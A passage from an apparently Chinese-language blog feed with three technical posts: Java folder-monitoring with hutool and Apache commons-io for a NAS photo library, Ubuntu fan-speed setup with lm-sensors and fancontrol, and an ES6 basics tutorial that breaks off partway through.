    <content type="html"><![CDATA[<p>关键字：Java、文件监听、hutool、apache</p><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>项目：NAS AI图库后端</p><p>语言：Java</p><p>需求：用户选择监听文件夹后，需要读取文件夹中所有图片信息存入数据库，并实时监听文件夹及其子文件夹中所有图片变动，根据变动更新数据库。</p><h2 id="2、实现方法"><a href="#2、实现方法" class="headerlink" title="2、实现方法"></a>2、实现方法</h2><p>通过查阅资料，得到java中有两种封装好的实现文件监听的库。</p><p>1、在Java 7中新增了java.nio.file.WatchService，通过它可以实现文件变动的监听。WatchService是基于操作系统的文件系统监控器，可以监控系统所有文件的变化，无需遍历、无需比较，是一种基于信号收发的监控，效率高。</p><p>在Hutool中，WatchMonitor主要针对JDK7中WatchService做了封装，针对文件和目录的变动（创建、更新、删除）做一个钩子，在Watcher中定义相应的逻辑来应对这些文件的变化。</p><p>优点很明显，效率很高，不足的地方也很明显，原本的 WatchService 只能监听当前目录下的文件和目录，不能监视子目录。在hutool中封装后可以监听一定层数子目录，但无法做到对新增文件夹的实时更新，即在监听文件夹中新传入一个文件夹时，必须要手动判断变更目录是否为文件夹，判定为是文件夹后再采用startListening方法监听这个文件夹才能正常监听该文件夹中的图片.</p><p>实现代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">watchMonitor.setWatcher(new Watcher()&#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onCreate(WatchEvent&lt;?&gt; event, Path currentPath) &#123;</span><br><span class="line">                String filePath = currentPath.toString() + &quot;/&quot; + event.context();</span><br><span class="line">                if (Files.isDirectory(Paths.get(filePath))) &#123;</span><br><span class="line">                    startListening(filePath);</span><br><span class="line">                &#125; else if (isImageFile(filePath)) &#123;</span><br><span class="line">                    handleFileCreated(filePath);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @Override</span><br><span class="line">            public void onDelete(WatchEvent&lt;?&gt; event, Path currentPath) &#123;</span><br><span class="line">                String filePath = currentPath.toString() + &quot;/&quot; + event.context();</span><br><span class="line">                if (Files.isDirectory(Paths.get(filePath))) &#123;</span><br><span class="line">                    handleFileDeleted(filePath);</span><br><span class="line">                &#125; else if (isImageFile(filePath)) &#123;</span><br><span class="line">                    handleFileDeleted(filePath);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            private boolean isImageFile(String filePath) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    String extension = filePath.substring(filePath.lastIndexOf(&#x27;.&#x27;)).toLowerCase();</span><br><span class="line">                    return allowedExtensions.contains(extension);</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        watchMonitor.setMaxDepth(MAX_DEPTH);</span><br><span class="line">        watchMonitor.start();</span><br></pre></td></tr></table></figure><p>像上面这样操作后，依然存在问题：因为是文件变更后才开启新的监听，所以当我将一个包含有图片的文件夹移动到我所监听的文件夹时，会漏掉新增文件夹中部分图片。根据测试在i7-11700KF的CPU上仅会漏掉最开始的一张图片，但我在开启新的监听前使用time.sleep睡眠一秒后会漏掉一百余张图片。NAS的机器上CPU性能远不如i7-11700KF，为了数据准确肯定要避免该情况发生。</p><p>如果要完全避免该情况发生，需要在监听文件夹下新增文件夹时中断当前的文件监听，待到成功监听新的文件夹后再继续之前的文件监听，这种实现似乎效率不高，之前查阅资料时看到还要一种实现方法，于是先试试另一种方法。</p><p>2、另一种文件监听方法是基于org.apache.commons.io.monitor包实现的监听，该包实现的文件监听实际上是每隔一段时间进行轮询操作，检测所监听文件夹下所有文件是否发生了变化，同时对于子文件夹采用递归监听的方式，轮询会更费一点资源，但是对于新增文件夹中变化的支持会更好。更契合AI相册的监听需求。</p><p>具体使用：先继承该包下的FileAlterationListenerAdaptor方法，该方法下可以重写当监听到文件变动时的处理操作。然后创建该包下FileAlterationMonitor对象，创建时需要设置间隔时间，然后创建FileAlterationObserver对象就可以直接使用了，实现还是很方便的。<br>实现代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public void startListening() &#123;</span><br><span class="line">    for (String path : listeningPathSet) &#123;</span><br><span class="line">        if (isSubDirectory(path)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        FileAlterationObserver observer = new FileAlterationObserver(new File(path), createRecursiveImageFileFilter());</span><br><span class="line">        FileAlterationMonitor monitor = new FileAlterationMonitor(POLLING_INTERVAL);</span><br><span class="line">        monitor.addObserver(observer);</span><br><span class="line">        observer.addListener(listener);</span><br><span class="line">        try &#123;</span><br><span class="line">            monitor.start();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        monitorMap.put(path, monitor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用这种方式实现监听后经过测试不会发生上面使用hutool导致的新建文件夹会漏图片的情况，但是也有一点小问题，即一张大图片复制过去，文件系统有时候会监听该文件有一次新增操作，还有一次修改操作。有修改操作是因为第一次监听到该文件变化的时候文件并没有完全写入，所以待到文件完全写入后和之前的状态又不一样，便有一次修改操作。对于这种情况不好避免，只能多进行一次数据库操作来更新图片信息，即在监听到文件新增时会将该数据插入到数据库中，监听到文件变更时将数据更新到数据库。</p><p>用上面的第二种方法能够满足功能需求，不会遗漏图片，所以就先调试到这里。</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu风扇转速控制</title>
    <link href="/2023/08/09/Ubuntu%E9%A3%8E%E6%89%87%E8%BD%AC%E9%80%9F%E6%8E%A7%E5%88%B6/"/>
    <url>/2023/08/09/Ubuntu%E9%A3%8E%E6%89%87%E8%BD%AC%E9%80%9F%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个文档是根据我当时配置风扇时询问ChatGPT的时候问的问题进行的记录，离我配置风扇已经过去两个月了，里面的细节已经完全记不清，所以只能记录下GPT的问题和回答，下次用的时候有一个参考，记得当时设置风扇转速花了一整天时间研究。</p><p>windows系统可以用fan contraller软件对显卡外接风扇进行转速控制，现在我重新装了ubuntu系统，需要对风扇转速进行访问<br>我的显卡的风扇是自己改装加上去的，插在主板的四针供电接口上</p><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p>在Ubuntu中，你可以尝试使用 lm-sensors 工具来监测硬件传感器和风扇速度。请按照以下步骤进行：</p><p>安装 lm-sensors：</p><p>打开终端。<br>运行以下命令以安装 lm-sensors：<br><code>sudo apt-get install lm-sensors</code></p><p>安装过程中可能会要求你输入密码。输入密码并等待安装完成。</p><p>配置和探测传感器：</p><p>在终端中运行以下命令以配置传感器：<br><code>sudo sensors-detect</code></p><p>它会问你一些问题，可以一路回车使用默认选项。</p><p>检查传感器读数：</p><p>在终端中运行以下命令以查看传感器读数：<br><code>sensors</code><br>这将显示你计算机上各个传感器的读数，包括风扇速度。<br>注意：lm-sensors 工具的可用性和准确性可能因计算机硬件而异。如果 lm-sensors 无法正确读取风扇转速或相关传感器信息，你可能需要尝试其他专门针对你的硬件的工具或方法。</p><p>此时我通过sensor查看到了我的显卡和cpu的温度，并没有查看到风扇信息和转速</p><p>如果你使用 lm-sensors 没有成功查看风扇信息和转速，那可能是因为传感器识别不到你的风扇或没有适配的驱动程序来支持它。在这种情况下，你可以尝试以下方法来进一步探索和控制你的风扇：</p><p>安装并使用 fancontrol 工具：</p><p>打开终端。<br>运行以下命令以安装 fancontrol：<br><code>sudo apt-get install fancontrol</code></p><p>安装完成后，运行以下命令以配置 fancontrol：<br><code>sudo pwmconfig</code><br>根据提示，该命令将尝试检测和配置你的风扇。请按照提示完成配置过程。</p><p>配置过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@hukaichao:/sys/class/hwmon/hwmon0/device# pwmconfig</span><br><span class="line"># pwmconfig version 3.6.0</span><br><span class="line">This program will search your sensors for pulse width modulation (pwm)</span><br><span class="line">controls, and test each one to see if it controls a fan on</span><br><span class="line">your motherboard. Note that many motherboards do not have pwm</span><br><span class="line">circuitry installed, even if your sensor chip supports pwm.</span><br><span class="line"></span><br><span class="line">We will attempt to briefly stop each fan using the pwm controls.</span><br><span class="line">The program will attempt to restore each fan to full speed</span><br><span class="line">after testing. However, it is ** very important ** that you</span><br><span class="line">physically verify that the fans have been to full speed</span><br><span class="line">after the program has completed.</span><br><span class="line"></span><br><span class="line">Found the following devices:</span><br><span class="line">   hwmon0 is nvme</span><br><span class="line">   hwmon1 is coretemp</span><br><span class="line">   hwmon2 is nct6793</span><br><span class="line"></span><br><span class="line">Found the following PWM controls:</span><br><span class="line">   hwmon2/pwm1           current value: 22</span><br><span class="line">hwmon2/pwm1 is currently setup for automatic speed control.</span><br><span class="line">In general, automatic mode is preferred over manual mode, as</span><br><span class="line">it is more efficient and it reacts faster. Are you sure that</span><br><span class="line">you want to setup this output for manual control? (n) </span><br></pre></td></tr></table></figure><p>此处输入y，将自动转为手动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">No correlations were detected.</span><br><span class="line">There is either no fan connected to the output of hwmon2/pwm5,</span><br><span class="line">or the connected fan has no rpm-signal connected to one of</span><br><span class="line">the tested fan sensors. (Note: not all motherboards have</span><br><span class="line">the pwm outputs connected to the fan connectors,</span><br><span class="line">check out the hardware database on http://www.almico.com/forumindex.php)</span><br><span class="line"></span><br><span class="line">Did you see/hear a fan stopping during the above test (n)? n</span><br><span class="line"></span><br><span class="line">Testing is complete.</span><br><span class="line">Please verify that all fans have returned to their normal speed.</span><br><span class="line"></span><br><span class="line">The fancontrol script can automatically respond to temperature changes</span><br><span class="line">of your system by changing fanspeeds.</span><br><span class="line">Do you want to set up its configuration file now (y)? y</span><br><span class="line">What should be the path to your fancontrol config file (/etc/fancontrol)? </span><br><span class="line"></span><br><span class="line">Select fan output to configure, or other action:</span><br><span class="line">1) Change INTERVAL</span><br><span class="line">2) Just quit</span><br><span class="line">3) Save and quit</span><br><span class="line">4) Show configuration</span><br><span class="line">select (1-n): </span><br></pre></td></tr></table></figure><p>此处输入1，进入修改模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Devices:</span><br><span class="line">hwmon0 is nvme</span><br><span class="line">hwmon1 is coretemp</span><br><span class="line">hwmon2 is nct6793</span><br><span class="line"></span><br><span class="line">Current temperature readings are as follows:</span><br><span class="line">hwmon0/temp1_input      36</span><br><span class="line">hwmon1/temp1_input      36</span><br><span class="line">hwmon1/temp2_input      32</span><br><span class="line">hwmon1/temp3_input      31</span><br><span class="line">hwmon1/temp4_input      33</span><br><span class="line">hwmon1/temp5_input      31</span><br><span class="line">hwmon1/temp6_input      32</span><br><span class="line">hwmon1/temp7_input      33</span><br><span class="line">hwmon1/temp8_input      34</span><br><span class="line">hwmon1/temp9_input      32</span><br><span class="line">hwmon2/temp1_input      118</span><br><span class="line">hwmon2/temp2_input      46</span><br><span class="line">hwmon2/temp3_input      25</span><br><span class="line">hwmon2/temp4_input      127</span><br><span class="line">hwmon2/temp5_input      127</span><br><span class="line">hwmon2/temp6_input      127</span><br><span class="line">hwmon2/temp7_input      17</span><br><span class="line">hwmon2/temp8_input      0</span><br><span class="line">hwmon2/temp9_input      0</span><br><span class="line"></span><br><span class="line">Select a temperature sensor as source for hwmon2/pwm2:</span><br><span class="line">1) hwmon0/temp1_input                      6) hwmon1/temp5_input                    11) hwmon2/temp1_input                    16) hwmon2/temp6_input</span><br><span class="line">2) hwmon1/temp1_input                      7) hwmon1/temp6_input                    12) hwmon2/temp2_input                    17) hwmon2/temp7_input</span><br><span class="line">3) hwmon1/temp2_input                      8) hwmon1/temp7_input                    13) hwmon2/temp3_input                    18) hwmon2/temp8_input</span><br><span class="line">4) hwmon1/temp3_input                      9) hwmon1/temp8_input                    14) hwmon2/temp4_input                    19) hwmon2/temp9_input</span><br><span class="line">5) hwmon1/temp4_input                     10) hwmon1/temp9_input                    15) hwmon2/temp5_input                    20) None (Do not affect this PWM output)</span><br><span class="line">select (1-n): </span><br></pre></td></tr></table></figure><p>此时我不知道选那个，因为我不知道hwmon2&#x2F;pwm2这个设备对应的是传感器中第几个温度读数</p><p>无法确定 hwmon2&#x2F;pwm2 设备对应的确切温度传感器。请再次运行 pwmconfig 命令，并在选择温度传感器时仔细观察输出，确保选择正确的温度传感器对应于你想要控制风扇的部件或传感器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Select fan output to configure, or other action:</span><br><span class="line">1) hwmon2/pwm2</span><br><span class="line">2) Change INTERVAL</span><br><span class="line">3) Just quit</span><br><span class="line">4) Save and quit</span><br><span class="line">5) Show configuration</span><br><span class="line">select (1-n): 2</span><br><span class="line"></span><br><span class="line">Current interval is 10 seconds.</span><br><span class="line">Enter the interval at which fancontrol should update PWM values (in s): </span><br></pre></td></tr></table></figure><p>在这个选项中，你可以更改 fancontrol 更新 PWM 值的时间间隔。默认的时间间隔是每 10 秒更新一次。</p><p>当你选择选项 2 并按回车键后，程序会要求你输入希望 fancontrol 更新 PWM 值的时间间隔。你可以根据自己的需求输入一个新的时间间隔（以秒为单位）。例如，如果你希望每 5 秒更新一次 PWM 值，你可以输入 “5” 并按回车键。</p><p>请根据你的需求输入一个合适的时间间隔，并按回车键进行更改。如果你想继续保持默认的 10 秒间隔，你可以直接按回车键跳过输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fancontrol</span><br><span class="line">INTERVAL=10</span><br><span class="line">DEVPATH=hwmon2=devices/platform/nct6775.2592</span><br><span class="line">DEVNAME=hwmon2=nct6793</span><br><span class="line">FCTEMPS=&lt;PWM输出1&gt;=&lt;温度传感器1路径&gt; &lt;PWM输出2&gt;=&lt;温度传感器2路径&gt; ...</span><br><span class="line">FCFANS= hwmon2/pwm2=hwmon2/fan2_input</span><br><span class="line">MINTEMP=40</span><br><span class="line">MAXTEMP=70</span><br><span class="line">MINSTART=20</span><br><span class="line">MINSTOP=10</span><br></pre></td></tr></table></figure><p>在修改 fancontrol 配置文件后，你需要重新启动 fancontrol 服务，以使新的配置生效。以下是在 Ubuntu 上重新启动 fancontrol 服务的步骤：</p><p>保存并关闭你所编辑的 fancontrol 配置文件。</p><p>打开终端。输入以下命令以停止 fancontrol 服务：</p><p><code>sudo service fancontrol stop</code></p><p>确保 fancontrol 服务已停止。你可以使用以下命令检查服务状态：</p><p><code>sudo service fancontrol status</code></p><p>如果输出中显示服务已停止，则可以继续下一步。</p><p>输入以下命令以启动 fancontrol 服务：</p><p><code>sudo service fancontrol start</code></p><p>确保 fancontrol 服务已成功启动。你可以再次使用以下命令检查服务状态：<br><code>sudo service fancontrol status</code></p><p>配置完成后，你可以使用以下命令启动 fancontrol：<br>sudo fancontrol<br>fancontrol 将根据你的配置监测温度并自动调整风扇转速。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ES6 基础使用</title>
    <link href="/2023/06/18/ES6%20%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/06/18/ES6%20%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h1><h2 id="1-ES6介绍"><a href="#1-ES6介绍" class="headerlink" title="1. ES6介绍"></a>1. ES6介绍</h2><p>JavaScript 基础教程:  <a href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a></p><p>ES6 入门教程: <a href="https://es6.ruanyifeng.com/">https://es6.ruanyifeng.com/</a></p><h2 id="2-ES6功能"><a href="#2-ES6功能" class="headerlink" title="2. ES6功能"></a>2. ES6功能</h2><h3 id="1-变量声明const和let"><a href="#1-变量声明const和let" class="headerlink" title="1.变量声明const和let"></a>1.变量声明const和let</h3><p>在ES6之前，我们都是用var关键字声明变量。无论声明在何处，都会被视为声明在函数的最顶部(不在函数内即在全局作用域的最顶部)。这就是函数变量提升例如:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">        <span class="keyword">var</span> test = <span class="string">&#x27;hello man&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(test)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上的代码实际上是：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> test <span class="comment">// 变量提升，函数最顶部</span></span><br><span class="line">  <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">      test = <span class="string">&#x27;hello man&#x27;</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//此处访问 test 值为 undefined</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(test)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//此处访问 test 值为 undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以不用关心flag是否为 true or false。实际上，无论如何 test 都会被创建声明。</p><p>接下来ES6主角登场：<br> 我们通常用 let 和 const 来声明，let 表示变量、const 表示常量。let 和 const 都是块级作用域。怎么理解这个块级作用域？</p><ul><li>在一个函数内部</li><li>在一个代码块内部</li></ul><blockquote><p>&#x3D;&#x3D;说白了只要在{}花括号内的代码块即可以认为 let 和 const 的作用域&#x3D;&#x3D;</p></blockquote><p>看以下代码：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">       <span class="keyword">let</span> test = <span class="string">&#x27;hello man&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//test 在此处访问不到</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(test)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>let</code>的作用域是在它所在当前代码块，但不会被提升到当前函数的最顶部。<br> 再来说说<code>const</code><br> <code>const</code>声明的变量必须提供一个值，而且会被认为是常量，意思就是它的值被设置完成后就不能再修改了。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;lux&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;joe&#x27;</span> <span class="comment">// 再次赋值此时会报错</span></span><br></pre></td></tr></table></figure><p>说说TDZ(暂时性死区)，想必你早有耳闻。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    console.log(<span class="keyword">value</span>) <span class="comment">// 报错</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">value</span> = <span class="string">&#x27;lala&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们都知道，JS引擎扫描代码时，如果发现变量声明，用 var 声明变量时会将声明提升到函数或全局作用域的顶部。但是 let 或者 const，会将声明关进一个小黑屋也是TDZ(暂时性死区)，只有执行到变量声明这句语句时，变量才会从小黑屋被放出来，才能安全使用这个变量。</p><p>哦了，说一道面试题</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> funcs = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      funcs.<span class="title function_">push</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(i) &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  funcs.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">func</span>) &#123;</span><br><span class="line">      <span class="title function_">func</span>()</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>这样的面试题是大家很常见，很多同学一看就知道输出十次10<br> 但是如果我们想依次输出0到9呢？<br> 有两种解决方法，直接看一下代码：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES5知识，我们可以利用“立即调用函数”解决这个问题</span></span><br><span class="line">  <span class="keyword">var</span> funcs = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      funcs.<span class="title function_">push</span>(</span><br><span class="line">        (<span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)(i)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  funcs.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">func</span>) &#123;</span><br><span class="line">      <span class="title function_">func</span>()</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 再来看看es6怎么处理的</span></span><br><span class="line">    <span class="keyword">const</span> funcs = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        funcs.<span class="title function_">push</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(i)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    funcs.<span class="title function_">forEach</span>(<span class="function"><span class="params">func</span> =&gt;</span> <span class="title function_">func</span>())</span><br></pre></td></tr></table></figure><p>达到相同的效果，ES6 简洁的解决方案是不是更让你心动！！！</p><h3 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h3><p> ES6模板字符简直是开发者的福音啊，解决了 ES5 在字符串功能上的痛点。</p><p>第一个用途，&#x3D;&#x3D;基本的字符串格式化&#x3D;&#x3D;。将表达式嵌入字符串中进行拼接。用${}来界定。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ES5 </span></span><br><span class="line"> <span class="keyword">var</span> name = <span class="string">&#x27;lux&#x27;</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hello&#x27;</span> + name)</span><br><span class="line"> <span class="comment">//es6</span></span><br><span class="line"> <span class="keyword">const</span> name = <span class="string">&#x27;lux&#x27;</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span>) <span class="comment">//hello lux</span></span><br></pre></td></tr></table></figure><p>第二个用途，在ES5时我们通过反斜杠()来做&#x3D;&#x3D;多行字符串或者字符串一行行拼接&#x3D;&#x3D;。ES6反引号(&#96;&#96;)直接搞定。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES5</span></span><br><span class="line">  <span class="keyword">var</span> msg = <span class="string">&quot;Hi \</span></span><br><span class="line"><span class="string">  man!</span></span><br><span class="line"><span class="string">  &quot;</span></span><br><span class="line">  <span class="comment">// ES6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">template</span> = `&lt;div&gt;</span><br><span class="line">      &lt;span&gt;hello world&lt;/span&gt;</span><br><span class="line">  &lt;/div&gt;`</span><br></pre></td></tr></table></figure><p>对于字符串 ES6+ 当然也提供了很多厉害也很有意思的方法😊 说几个常用的。</p><figure class="highlight 